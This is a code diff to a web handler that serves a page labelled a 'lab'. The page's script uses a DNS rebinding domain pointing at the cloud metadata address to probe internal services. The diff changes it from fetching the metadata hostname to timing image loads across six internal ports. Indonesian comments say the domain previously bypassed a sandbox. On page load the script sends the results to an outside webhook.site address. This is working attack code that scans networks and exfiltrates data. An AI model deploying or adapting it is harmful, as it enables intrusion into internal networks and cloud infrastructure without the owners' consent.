@@ -2,39 +2,45 @@ export default function handler(req, res) {
   res.setHeader('Content-Type', 'text/html');
   res.status(200).send(`
     <html>
-      <head><title>NyxSec Rebinding Lab</title></head>
+      <head><title>NyxSec Multi-Port Lab</title></head>
       <body>
-        <pre>Status: Initiating DNS Rebinding Attack...</pre>
+        <pre>Status: Mapping Internal Services via DNS Rebinding...</pre>
         <script>
           const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
-          const rebindDomain = "http://01010101.a9fea9fe.rbndr.us/computeMetadata/v1/instance/hostname";
+          // Menggunakan domain rebinding yang sebelumnya berhasil mem-bypass sandbox
+          const rebindBase = "01010101.a9fea9fe.rbndr.us"; 
 
-          async function attemptRebind(id) {
+          async function probePort(port) {
             const start = Date.now();
             return new Promise((resolve) => {
               const img = new Image();
+              
+              // Timeout 7 detik (sedikit lebih lama untuk menangkap delay jaringan internal)
               const timer = setTimeout(() => {
-                resolve({ id, time: Date.now() - start, status: "timeout" });
-              }, 3000);
+                img.src = ""; 
+                resolve({ port, time: Date.now() - start, status: "timeout" });
+              }, 7000);
 
               img.onload = img.onerror = () => {
                 clearTimeout(timer);
-                resolve({ id, time: Date.now() - start, status: "finished" });
+                resolve({ port, time: Date.now() - start, status: "finished" });
               };
 
-              // Memaksa resolusi DNS baru dengan parameter acak
-              img.src = rebindDomain + "?cache=" + Math.random();
+              // Menyerang kombinasi Host + Port
+              img.src = "http://" + rebindBase + ":" + port + "/favicon.ico?cache=" + Math.random();
             });
           }
 
           async function runTest() {
+            const ports = [80, 443, 8080, 8443, 9000, 9090]; // Daftar port internal umum
             const results = [];
-            // Melakukan 10 percobaan cepat untuk memicu rotasi DNS rbndr.us
-            for(let i=0; i<10; i++) {
-              results.push(await attemptRebind(i));
+            
+            for(const port of ports) {
+              results.push(await probePort(port));
             }
 
-            fetch(webhook + "?rebind_results=" + btoa(JSON.stringify(results)));
+            // Kirim laporan lengkap ke Webhook Aditya
+            fetch(webhook + "?multi_port=" + btoa(JSON.stringify(results)));
           }
 
           runTest();
